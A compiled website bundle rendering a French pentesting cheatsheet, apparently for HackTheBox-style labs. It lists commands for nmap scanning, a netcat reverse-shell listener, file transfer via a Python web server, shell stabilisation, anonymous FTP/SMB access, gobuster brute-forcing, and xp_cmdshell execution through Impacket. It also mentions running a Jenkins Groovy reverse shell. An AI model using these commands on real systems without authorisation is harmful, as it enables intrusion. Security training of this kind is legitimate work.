"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[2992],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return m}});var r=n(7294);function s(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function a(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach((function(t){s(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,s=function(e,t){if(null==e)return{};var n,r,s={},l=Object.keys(e);for(r=0;r<l.length;r++)n=l[r],t.indexOf(n)>=0||(s[n]=e[n]);return s}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(r=0;r<l.length;r++)n=l[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(s[n]=e[n])}return s}var o=r.createContext({}),u=function(e){var t=r.useContext(o),n=t;return e&&(n="function"==typeof e?e(t):a(a({},t),e)),n},c=function(e){var t=u(e.components);return r.createElement(o.Provider,{value:t},e.children)},p={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,s=e.mdxType,l=e.originalType,o=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),d=u(n),m=s,h=d["".concat(o,".").concat(m)]||d[m]||p[m]||l;return n?r.createElement(h,a(a({ref:t},c),{},{components:n})):r.createElement(h,a({ref:t},c))}));function m(e,t){var n=arguments,s=t&&t.mdxType;if("string"==typeof e||s){var l=n.length,a=new Array(l);a[0]=d;var i={};for(var o in t)hasOwnProperty.call(t,o)&&(i[o]=t[o]);i.originalType=e,i.mdxType="string"==typeof e?e:s,a[1]=i;for(var u=2;u<l;u++)a[u]=n[u];return r.createElement.apply(null,a)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},5180:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return i},contentTitle:function(){return o},metadata:function(){return u},toc:function(){return c},default:function(){return d}});var r=n(7462),s=n(3366),l=(n(7294),n(3905)),a=["components"],i={},o=void 0,u={unversionedId:"Cibersecurity/Red Team/Cheatsheet",id:"Cibersecurity/Red Team/Cheatsheet",title:"Cheatsheet",description:"Objectif",source:"@site/docs/Cibersecurity/Red Team/Cheatsheet.md",sourceDirName:"Cibersecurity/Red Team",slug:"/Cibersecurity/Red Team/Cheatsheet",permalink:"/docs/Cibersecurity/Red Team/Cheatsheet",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/Cibersecurity/Red Team/Cheatsheet.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Bookmarks",permalink:"/docs/Cibersecurity/Red Team/Bookmarks"},next:{title:"Network Services",permalink:"/docs/Cibersecurity/Red Team/Network Services"}},c=[{value:"Objectif",id:"objectif",children:[],level:3},{value:"Nmap",id:"nmap",children:[],level:3},{value:"Commandes utiles",id:"commandes-utiles",children:[],level:3},{value:"21 TCP FTP",id:"21-tcp-ftp",children:[{value:"Jenkins",id:"jenkins",children:[],level:4}],level:3},{value:"23 TCP Telnet",id:"23-tcp-telnet",children:[],level:3},{value:"80 TCP HTTP",id:"80-tcp-http",children:[],level:3},{value:"445 TCP SMB",id:"445-tcp-smb",children:[],level:3},{value:"1433 TCP MSSQL",id:"1433-tcp-mssql",children:[],level:3},{value:"3306 TCP Mysql",id:"3306-tcp-mysql",children:[],level:3},{value:"3389 TCP RDP",id:"3389-tcp-rdp",children:[],level:3}],p={toc:c};function d(e){var t=e.components,n=(0,s.Z)(e,a);return(0,l.kt)("wrapper",(0,r.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h3",{id:"objectif"},"Objectif"),(0,l.kt)("p",null,"Afin de simplifier et de r\xe9sumer les diff\xe9rentes phases de pentesting, j'\xe9cris dans cet article les commandes les plus utilis\xe9es.\nL'objectif pricipal est d'expliquer bri\xe8ment la fonction de chaque commande, pour permettre leur utilisation r\xe9cursive."),(0,l.kt)("h3",{id:"nmap"},"Nmap"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"nmap -sV -sC {IP-dest}\n")),(0,l.kt)("p",null,"Dans ce lien, vous pouvez t\xe9l\xe9charger un bon PDF: ",(0,l.kt)("a",{parentName:"p",href:"https://stationx-public-download.s3.us-west-2.amazonaws.com/nmap_cheet_sheet_v7.pdf"},"Nmap cheatsheet")),(0,l.kt)("h3",{id:"commandes-utiles"},"Commandes utiles"),(0,l.kt)("p",null,"\xc9crire \xe0 la fin d'un document"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},'echo "{dest-IP} ignition.htb" | sudo tee -a /etc/hosts\n')),(0,l.kt)("p",null,"Cr\xe9er un listener sur le port sp\xe9cifi\xe9 avec NETCAT pour recevoir des conexion externes."),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"nc -lvnp 8000\n \n #-l   : Mode \xe9coute\n #-v   : Mode verboux. Montre plus de d\xe9tails dans les messages\n #-n   : Adresses IP num\xe9riques uniquement, pas de r\xe9solution DNS\n #-p   : Port d'\xe9coute\n")),(0,l.kt)("p",null,"Cr\xe9er un serveur http avec python et partage de fichiers "),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"}," # \xe0 partir du dossier o\xf9 l'on veut partager les fichiers\npython3 -m http.server 80\n\n #pour acc\xe9der aux ficiers\nwget http://host-IP/fichier -outfile fichier\n")),(0,l.kt)("p",null,"Stablish a functional shell, sometimes it's important to set a TTY after the exploitation"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n")),(0,l.kt)("h3",{id:"21-tcp-ftp"},"21 TCP FTP"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"ftp {target_IP} #Puis login avec anonymous\n\n #help  :Liste de commandes\n #get   :Telecharger des fichiers\n #bye   :sortir\n")),(0,l.kt)("h4",{id:"jenkins"},"Jenkins"),(0,l.kt)("p",null,"Apr\xe8s avoir appris que vous pouvez ex\xe9cuter des scropts Groovy dans Jenkins, vous acc\xe9dez \xe0 l'un des sites Web \xe9num\xe9r\xe9s ci-dessus et ex\xe9cutez un reverse shell."),(0,l.kt)("h3",{id:"23-tcp-telnet"},"23 TCP Telnet"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"telnet {IP-dest}\n")),(0,l.kt)("h3",{id:"80-tcp-http"},"80 TCP HTTP"),(0,l.kt)("p",null,"Gobuster est un outil pour forcer avec bruteforce les r\xe9pertoires, fichiers et sous-domaines DNS"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"gobuster dir -u http://10.129.33.133:80 -w /usr/share/wordlists/dirb/common.txt\ngobuster dir -u http://10.129.1.15 dir -w /usr/share/wordlists/dirb/common.txt -x php,html\n\n # -x  :l'extension sp\xe9cifi\xe9e est ajout\xe9e \xe0 tous les mots contenus dans le dictionnaire -w. \n # Pour conna\xeetre le bon format, vous pouvez utiliser le plugin Wappalyzer et voir quelles technologies sont utilis\xe9es\n # -u  :pour le r\xe9pertoire\n # -w  :pour le dictionnaire\n #Pour t\xe9l\xe9charger les listes les plus utilis\xe9es, <apt -y install seclists> et peut \xeatre trouv\xe9 dans /usr/share/seclists/\n")),(0,l.kt)("p",null,"Pour obtenir plus d'informations sur une demande, vous pouvez utiliser cURL"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"curl -v http://{dest-IP}/\n")),(0,l.kt)("h3",{id:"445-tcp-smb"},"445 TCP SMB"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"smbclient -L \\\\\\\\{dest-IP}\n # smbclient -L \\\\\\\\{dest-IP} -U 'administrator' #sans mot de passe   \nsmbclient \\\\\\\\{dest-IP}\\\\{\xe9l\xe9ments partag\xe9s} #Appuyez sur entr\xe9e sans mot de passe\n # smbclient \\\\\\\\{dest-IP}\\\\{\xe9l\xe9ments partag\xe9s} -U 'administrator'\n \n # -L   : Afficher les fichiers partag\xe9s\n # -U   : Nom d'utilisateur\n # get  : Lorsque vous acc\xe9dez \xe0 smb, pour t\xe9l\xe9charger des fichiers\n")),(0,l.kt)("h3",{id:"1433-tcp-mssql"},"1433 TCP MSSQL"),(0,l.kt)("p",null,"Utilisarion de Inpacket"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},"python3 mssqlclient.py ARCHETYPE/sql_svc@{dest-IP} -windows-auth\n")),(0,l.kt)("p",null,"Une fois \xe0 l'int\xe9rieur, xp_cmdshell est utilis\xe9 pour ex\xe9cuter les commandes"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre"},'SQL> xp_cmdshell "powershell -c whoami" # Exemple\n')),(0,l.kt)("h3",{id:"3306-tcp-mysql"},"3306 TCP Mysql"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"mysql -h {ip-dest} -u {user}\n\n # mysql --help\n # SHOW databases;              : Imprime les bases de donn\xe9es auxquelles nous pouvons acc\xe9der.\n # USE {database_name};         : D\xe9fini pour utiliser la base de donn\xe9es nomm\xe9e {base de donn\xe9es}\n # SHOW tables;                 : Imprime les tables disponible dans la base de donn\xe9es actuelle.\n # SELECT * FROM {table_name};  : Imprime toutes les donn\xe9es de la table {table}\n")),(0,l.kt)("p",null,(0,l.kt)("a",{parentName:"p",href:"https://www.mysqltutorial.org/mysql-cheat-sheet.aspx"},"SQL Cheatsheet")),(0,l.kt)("h3",{id:"3389-tcp-rdp"},"3389 TCP RDP"),(0,l.kt)("pre",null,(0,l.kt)("code",{parentName:"pre",className:"language-shell"},"xfreerdp /v:{dest-IP} /cert:ignore /u:Administrator\n")))}d.isMDXComponent=!0}}]);